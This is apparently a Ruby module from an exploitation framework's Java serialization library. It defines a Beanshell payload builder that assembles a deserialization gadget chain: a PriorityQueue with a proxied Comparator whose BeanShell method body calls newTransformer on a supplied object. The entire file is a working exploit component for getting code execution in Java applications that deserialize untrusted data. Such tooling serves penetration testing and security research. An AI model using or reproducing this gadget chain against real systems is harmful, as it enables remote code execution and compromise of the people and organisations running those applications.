# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Beanshell
          def self.make_invoke_noarg(obj, _method)
            block = Model::JavaObject.new('Lbsh/BSHBlock;', 
                                          'children' => Model::JavaArray.new('Lbsh/Node;', [
                                            Model::JavaObject.new('Lbsh/BSHPrimaryExpression;', 
                                                                  'children' => Model::JavaArray.new('Lbsh/Node;', [
                                                                    Model::JavaObject.new('Lbsh/BSHLiteral;', 'value' => obj),
                                                                    Model::JavaObject.new('Lbsh/BSHPrimarySuffix;', 
                                                                                          'field' => 'newTransformer',
                                                                                          'operation' => 2,
                                                                                          'children' => 
                                            Model::JavaArray.new('Lbsh/Node;',
                                                                 [Model::JavaObject.new('Lbsh/BSHArguments;', {})]
                                                                ))
                                            ]))
            ]))

            ns = Model::JavaObject.new('Lbsh/NameSpace;', 
                                       'methods' => Model::JavaObject.new('Ljava/util/Hashtable;', 
                                                                          'elements' => {
                                         'compare' => Model::JavaObject.new('Lbsh/BshMethod;', 
                                                                            'name' => 'compare',
                                                                            'numArgs' => 2,
                                                                            'paramNames' => Model::JavaArray.new('Ljava/lang/String;', %w[a b]),
                                                                            'cparamTypes' => Model::JavaArray.new('Ljava/lang/Class;',
                                                                                                                  [Model::JavaClass.new('Ljava/lang/Object;'),
                                                                                                                   Model::JavaClass.new('Ljava/lang/Object;')]),
                                       'methodBody' => block)
                                       }))

            xth = Model::JavaObject.new('Lbsh/XThis;', 'interfaces' => nil,
                                        'namespace' => ns)

            invh = Model::JavaObject.new('Lbsh/XThis$Handler;', 'this$0' => xth)

            comp = Model::JavaProxy.new(['java.util.Comparator'], invh)
            Model::JavaObject.new('Ljava/util/PriorityQueue;', 'comparator' => comp,
                                  'elements' => %w[foo bar])
          end
        end
      end
    end
  end
end
